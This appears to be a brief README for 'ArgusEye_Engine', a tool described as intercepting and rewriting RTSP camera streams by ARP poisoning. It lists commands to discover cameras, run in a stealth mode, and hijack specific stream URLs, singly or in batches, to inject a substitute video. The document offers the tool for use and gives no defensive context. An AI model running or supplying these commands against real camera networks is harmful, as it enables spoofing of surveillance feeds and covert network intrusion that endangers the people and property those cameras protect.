# ArgusEye_Engine
RTSP Stream Interception &amp; Dynamic Rewriting -- Arp Poisoning Cluster
# Video Matrix
python3 argus_core/video_matrix.py --discover
python3 argus_core/video_matrix.py --cameras "rtsp://192.168.1.100/live,rtsp://192.168.1.101/live"
python3 argus_core/video_matrix.py --file camera_config.json --stealth

# RTSP Hijacker
python3 argus_core/matrix_hijacker.py --target rtsp://192.168.1.100/live --video alert.mp4
python3 argus_core/matrix_hijacker.py --batch batch_config.json
python3 argus_core/matrix_hijacker.py --list
